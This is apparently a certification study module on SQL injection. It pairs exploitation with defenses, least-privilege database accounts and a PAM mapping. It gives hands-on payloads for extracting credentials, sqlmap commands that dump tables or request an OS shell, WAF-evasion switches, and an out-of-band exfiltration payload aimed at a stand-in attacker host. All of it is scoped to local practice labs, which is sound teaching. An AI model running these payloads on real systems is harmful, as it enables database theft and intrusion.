# Module 15 — SQL Injection

> **One-liner:** the classic "untrusted input reaches the SQL interpreter" flaw — how to find it, how to exploit it by hand and with sqlmap, and why the fix is *parameterized queries + a least-privilege DB account*. For a PAM reader this is a story about a service account with far too much power on the database.

## Exam focus

- The **SQLi taxonomy**: in-band (error-based, UNION-based), inferential/**blind** (boolean-based, time-based), and **out-of-band** (OOB) — and how to tell them apart.
- **Where injection lives**: any input that is concatenated into a query — GET/POST params, cookies, HTTP headers (`User-Agent`, `Referer`), and stored values.
- The **manual workflow**: detect → determine column count → find injectable columns → enumerate schema (`information_schema`) → extract data.
- **Second-order (stored) SQLi** — input is saved safely, then reused unsafely in a later query.
- **sqlmap** switches by purpose (`--dbs`, `-D/-T/-C`, `--dump`, `--technique`, `--level/--risk`, `-r`, `--os-shell`).
- **Defenses in priority order**: parameterized queries/prepared statements first, then least-privilege DB accounts, input validation, WAF, and stored procedures (with caveats).
- Database fingerprint tells: `@@version`/`WAITFOR` (MSSQL), `version()`/`SLEEP` (MySQL), `UTL_HTTP`/`dual` (Oracle), `pg_sleep` (PostgreSQL).

## Key concepts

### SQLi taxonomy (the table the exam builds questions from)

| Class | Sub-type | How the data comes back | Signature payload (MySQL) |
|---|---|---|---|
| In-band | Error-based | DB error text leaks data | `' AND extractvalue(1,concat(0x7e,version())) -- -` |
| In-band | UNION-based | Appended `UNION SELECT` row | `' UNION SELECT 1,version() -- -` |
| Inferential (blind) | Boolean-based | Page changes true vs. false | `' AND 1=1 -- -` vs `' AND 1=2 -- -` |
| Inferential (blind) | Time-based | Response delay = true | `' AND SLEEP(5) -- -` |
| Out-of-band (OOB) | DNS/HTTP exfil | Separate channel (DNS/HTTP) | `... LOAD_FILE(CONCAT('\\\\',(SELECT ...),'.attacker'))` |

- **In-band** = data returns on the *same* channel/response (fastest, noisiest).
- **Blind** = no data in the response; you infer it one bit at a time (true/false page or a delay). Slow — automate it.
- **OOB** = used when the app is blind *and* you can make the DB open a new connection (DNS/HTTP). Depends on DB features and egress (`xp_dirtree`/`UTL_HTTP`/`LOAD_FILE` UNC).

### The manual exploitation workflow

```
┌────────────┐  ┌─────────────────┐  ┌──────────────────┐  ┌────────────────────┐  ┌────────────┐
│ 1. Detect  │─▶│ 2. Count columns│─▶│ 3. Find visible  │─▶│ 4. Enumerate schema│─▶│ 5. Extract │
│  ' " break │  │  ORDER BY n     │  │    UNION columns │  │  information_schema│  │  the data  │
└────────────┘  └─────────────────┘  └──────────────────┘  └────────────────────┘  └────────────┘
```

1. **Detect** — inject `'`, `"`, `\`; watch for an error or changed behaviour. Confirm with `' OR '1'='1` and boolean pairs.
2. **Count columns** — `... ORDER BY 1 -- -`, increment until it errors; the last working number = column count. (Or step a `UNION SELECT 1,2,3` until no error.)
3. **Find the reflected columns** — `... UNION SELECT 1,2,3 -- -` and see which numbers render on the page.
4. **Enumerate** — swap a visible column for `version()`, `database()`, `current_user()`, then query `information_schema.tables` / `information_schema.columns`.
5. **Extract** — pull the target rows (e.g., `username,password` from `users`).

### Second-order (stored) SQLi

Input is **stored safely** (often via a parameterized INSERT), then later **read back and concatenated** into a *different* query without escaping. Example: register a username `admin'-- -`; the profile-update page later builds `UPDATE users SET ... WHERE name='admin'-- -'`. First-order scanners that only test the entry point miss it — the sink is elsewhere. sqlmap models this with a second request (`--second-url` / `--second-req`).

### DBMS fingerprint cheat-sheet

| Feature | MySQL/MariaDB | MSSQL | PostgreSQL | Oracle |
|---|---|---|---|---|
| Version | `version()` / `@@version` | `@@version` | `version()` | `SELECT banner FROM v$version` |
| Delay | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `dbms_lock.sleep(5)` |
| Concat | `CONCAT()` / `0x` | `+` | `\|\|` | `\|\|` |
| String from no table | (none needed) | (none needed) | (none needed) | `... FROM dual` |
| Comment | `-- -` , `#` | `--` | `--` | `--` |

## Key tools

| Tool | Purpose | Reference |
|---|---|---|
| sqlmap | Automated detection + exploitation | https://sqlmap.org/ |
| Burp Suite | Intercept, tamper, save requests for sqlmap (`-r`) | https://portswigger.net/burp |
| DVWA | Deliberately vulnerable PHP/MySQL app | https://github.com/digininja/DVWA |
| bWAPP | "Buggy web app" with many SQLi variants | https://github.com/raesene/bWAPP |
| PortSwigger Web Security Academy | Free SQLi labs & reference | https://portswigger.net/web-security/sql-injection |

## Commands & techniques (lab-ready)

> Run only against your own lab web targets — **DVWA `localhost:8081`**, **bWAPP `localhost:8084`** (see [`../../labs/topology.md`](../../labs/topology.md)). Never point sqlmap at anything you don't own.

### Manual payloads (paste into the vulnerable field)

```sql
-- Detect
1'                       -- error or broken page?
1' OR '1'='1' -- -       -- always-true
1" OR "1"="1             -- try double quotes too

-- Column count, then find reflected columns
1' ORDER BY 3 -- -
1' UNION SELECT 1,2 -- - -- adjust count to match

-- Fingerprint + current context (DVWA is MySQL)
1' UNION SELECT version(), database() -- -
1' UNION SELECT current_user(), @@version -- -

-- Enumerate schema
1' UNION SELECT table_name, table_schema FROM information_schema.tables -- -
1' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users' -- -

-- Extract credentials
1' UNION SELECT user, password FROM users -- -

-- Blind (boolean) — same page vs. changed page
1' AND SUBSTRING(version(),1,1)='5' -- -
-- Blind (time) — 5s delay means the condition is true
1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0) -- -
```

### sqlmap against DVWA (GET, needs an authenticated cookie)

DVWA needs a valid `PHPSESSID` and its `security` cookie. Log in in the browser (default `admin`/`password`), set **Security = low**, copy the cookies, then:

```bash
# Enumerate databases
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<yours>; security=low" --batch --dbs

# Drill into the dvwa DB → tables → dump users
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<yours>; security=low" -D dvwa --tables
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<yours>; security=low" -D dvwa -T users --dump

# Current user / DB / privileges (is the service account overprivileged?)
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<yours>; security=low" --current-user --current-db --is-dba --privileges
```

### sqlmap against bWAPP (choose the SQLi lab, set the security level)

```bash
# bWAPP: log in (bee/bug), pick "SQL Injection (GET/Search)"; low security = security_level=0
sqlmap -u "http://localhost:8084/sqli_1.php?title=iron&action=search" \
       --cookie="PHPSESSID=<yours>; security_level=0" --batch --dbs

# POST form: let sqlmap read the parameters from --data
sqlmap -u "http://localhost:8084/sqli_6.php" --data="login=x&password=x&form=submit" \
       --cookie="PHPSESSID=<yours>; security_level=0" --batch
```

### Handy sqlmap switches to memorize

```bash
sqlmap -r request.txt              # feed a full HTTP request saved from Burp (cleanest)
       --level 5 --risk 3          # deeper tests: headers, cookies, more payloads
       --technique=BEUST           # B=boolean E=error U=union S=stacked T=time
       --dbms=mysql                # skip fingerprinting if you know it
       --tamper=space2comment      # WAF evasion transforms
       --random-agent              # rotate User-Agent
       --second-url "<url>"        # SECOND-ORDER: where the stored value is used
       --os-shell / --sql-shell    # interactive shell if privileges allow
       --batch                     # accept defaults (non-interactive)
```

## Lab exercise

1. **Manual first (DVWA, Security = low):** find the injection in `/vulnerabilities/sqli/`, use `ORDER BY` to get the column count, then `UNION SELECT` to dump `user,password` from `users`. Crack the resulting hashes (they're MD5) to prove impact.
2. **Automate the same result:** reproduce step 1 with `sqlmap ... --dump`. Compare effort.
3. **Feel "blind":** switch DVWA to **Security = medium** (POST + `mysqli_real_escape_string`) and to **SQL Injection (Blind)**. Watch sqlmap fall back to boolean/time techniques — much slower.
4. **See the control work:** switch DVWA to **Security = high / impossible**. The *impossible* level uses a **prepared statement (parameterized query)** — the injection dies. Read that source; that one change is the whole defense.
5. **Least privilege check:** run `--is-dba --privileges`. Note whether the app's DB user is effectively admin — then imagine that user restricted to `SELECT` on two tables.

**What you should observe:** exploitation difficulty scales with the defense — string-concatenation is trivial, escaping slows you to blind, and a **parameterized query stops you cold**. The blast radius of any success is set by the **DB account's privileges**.

## Defender & PAM mapping

| Attack | Detection signal | Control / PAM lever |
|---|---|---|
| UNION/error-based extraction | DB errors in web logs, `UNION SELECT`/`information_schema` in query logs, WAF alerts | **Parameterized queries** (root fix); WAF as compensating control |
| Blind (boolean/time) | Bursts of near-identical requests, repeated `SLEEP`/`WAITFOR`, latency spikes | Query allow-listing, statement timeouts, rate limiting, WAF anomaly rules |
| Mass data dump via SQLi | Large/unusual result volume from the app's DB user | **Least-privilege DB account** (no `SELECT *` on everything, no admin), row limits |
| `--os-shell` / stacked queries / `xp_cmdshell` | New OS process from DB service, `xp_cmdshell` enabled, `INTO OUTFILE` | Least privilege on DB service account; disable `xp_cmdshell`/`FILE` priv; app-tier isolation |
| Stolen/hardcoded DB creds | DB creds in source, config, or repo history | **Secrets manager/vault** for DB creds, short-lived tokens, rotation, no creds in code |
| Privileged/off-hours DB access | Direct logins to the DB bypassing the app, admin access outside change windows | **PAM brokering + session recording** for DBA access, JIT elevation, approval workflow |
| Second-order SQLi | Injection payloads appearing in *stored* fields, later query errors | Parameterize **every** sink (reads too), output/context encoding, code review of stored-value reuse |

> **PAM playbook for this module:** the database is a Tier-1 asset. Give the application a **dedicated, least-privilege DB account** (only the exact tables/verbs it needs — never `db_owner`/`root`), keep its credentials in a **vault** and rotate them, and force all **human/DBA access through the PAM broker** with session recording and JIT. Then even a working injection dumps a narrow slice, not the whole database — and every privileged touch is logged. Broader attack↔control mapping lives in [`../../defender-pam/`](../../defender-pam/).

## Exam tips & gotchas

- **In-band vs. blind vs. OOB**: in-band returns data in the response; blind infers it (boolean/time) with *no* data returned; OOB uses a separate channel (DNS/HTTP). A question mentioning "SLEEP/WAITFOR/pg_sleep" = **time-based blind**.
- **Parameterized queries / prepared statements** are the *primary* defense — not WAF, not input validation, not stored procedures. Stored procedures only help **if** they don't build dynamic SQL internally (they can still be injectable).
- **Least privilege limits impact, it doesn't prevent injection** — both facts appear as answer choices; read the stem.
- **`ORDER BY n`** finds the column count; **`UNION SELECT`** requires the **same number and compatible types** of columns.
- **`information_schema`** is the standard place to enumerate DBs/tables/columns (MySQL/MSSQL/PostgreSQL); **Oracle** uses `ALL_TABLES`/`dual`.
- **Second-order** = safe write, unsafe later read. It defeats naive point-of-entry testing.
- **WAF is a compensating control**, and `--tamper` scripts exist precisely to bypass it — never treat a WAF as the fix.

## Sources

- OWASP SQL Injection — https://owasp.org/www-community/attacks/SQL_Injection
- OWASP SQL Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP Query Parameterization Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
- sqlmap — https://sqlmap.org/
- PortSwigger Web Security Academy: SQL injection — https://portswigger.net/web-security/sql-injection
- DVWA — https://github.com/digininja/DVWA
- MITRE CWE-89 (SQL Injection) — https://cwe.mitre.org/data/definitions/89.html

---
### 📝 My lab log (fill in)
| Date | Target | Command | Result / notes |
|---|---|---|---|
|  |  |  |  |
